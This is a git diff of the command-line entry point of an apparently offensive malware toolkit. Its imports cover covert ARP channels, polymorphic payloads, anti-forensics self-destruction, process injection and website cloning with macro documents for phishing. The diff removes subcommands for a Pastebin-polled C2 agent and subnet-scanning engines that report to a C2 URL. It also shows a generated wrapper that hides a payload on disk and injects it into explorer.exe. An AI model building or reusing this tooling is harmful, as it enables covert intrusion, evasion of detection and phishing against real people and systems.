@@ -19,10 +19,8 @@ from modules.wizard import encode_wizard
 from modules.covert_channel import send_arp_covert, listen_arp_covert
 from modules.polymorphic_engine import create_polymorphic_payload, generate_encryption_stub
 from modules.anti_forensics import scorched_earth
-from modules.ape import unleash_ape
 from modules.evasion import inject_code, hide_in_filesystem, find_process_by_name
-from modules.hare import unleash_hare
-import subprocess
+from modules.social_engineering import clone_website, create_macro_doc, send_email
 
 def load_config(config_path='config.json'):
     """Load configuration from a JSON file."""
@@ -148,22 +146,6 @@ def main():
     resilience_parser.add_argument("--enable-guardian", action="store_true", help="Enable Guardian mode")
     resilience_parser.add_argument("--self-destruct", action="store_true", help="Activate Scorched Earth policy")
 
-    # C2 Agent
-    c2_parser = subparsers.add_parser("c2-agent", help="Start the C2 agent")
-    c2_parser.add_argument("--url", required=True, help="The Pastebin URL to poll for commands")
-    c2_parser.add_argument("--interval", type=int, default=60, help="Polling interval in seconds")
-
-    # APE
-    ape_parser = subparsers.add_parser("ape-unleash", help="Unleash the APE engine")
-    ape_parser.add_argument("--c2-url", required=True, help="C2 URL for the APE to report back to")
-    ape_parser.add_argument("--subnet", required=True, help="Initial subnet for the APE to scan")
-
-    # HARE
-    hare_parser = subparsers.add_parser("hare-unleash", help="Unleash the HARE engine")
-    hare_parser.add_argument("--c2-url", required=True, help="C2 URL for the HARE to report back to")
-    hare_parser.add_argument("--subnet", required=True, help="Initial subnet for the HARE to scan")
-
-
     args = parser.parse_args()
 
     level = logging.DEBUG if args.verbose else logging.INFO
@@ -192,21 +174,13 @@ def main():
 
             if args.evasive:
                 # This is a conceptual demonstration.
-                # An evasive payload would likely be a script that, when run,
-                # hides itself in the filesystem and then injects the final payload.
                 logging.info("Creating an evasive payload wrapper...")
                 evasive_wrapper = f"""
 import sys
 from modules.evasion import hide_in_filesystem, inject_code, find_process_by_name
 
-# The actual payload is embedded here
 final_payload = {payload_to_embed}
-
-# 1. Hide the payload in a cover file
 cover_file = hide_in_filesystem(final_payload)
-
-# 2. Inject the payload into a target process
-# (This is a simplified example)
 target_pid = find_process_by_name("explorer.exe")
 if target_pid:
     inject_code(target_pid, final_payload)
